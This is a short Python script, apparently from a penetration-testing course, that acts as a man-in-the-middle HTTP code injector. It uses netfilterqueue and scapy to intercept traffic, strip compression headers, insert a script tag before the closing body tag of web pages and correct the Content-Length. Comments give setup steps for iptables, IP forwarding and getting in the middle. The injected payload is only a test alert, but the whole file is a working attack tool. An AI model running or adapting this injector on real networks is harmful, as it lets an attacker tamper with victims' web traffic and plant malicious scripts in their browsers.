#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

# you must run iptables rules for input and output for queue 0
# to run it against a remote computer use the forward chain
# start your web browser and flush ip tables
# enable IP forwarding to the attacker machine
# be the man in the middle
# run it


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                # we user regular expressions in this case to get the html code back without encryption
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] response")
                # print(scapy_packet.show())
                injection_code = "<script>alert('test');</script>"
                load = load.replace("</body>", injection_code + "</body>")
                # code which debugs the content length problem which cuts the code if the content length size of the
                # client is different from the server because we inject code
                # you can seperate regex with groups by using parenthesis ex (\d*)
                # you can capture the whole expression with non capturing part (dont include that part)
                # using ?: like below
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
                    # print(content_length)

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()





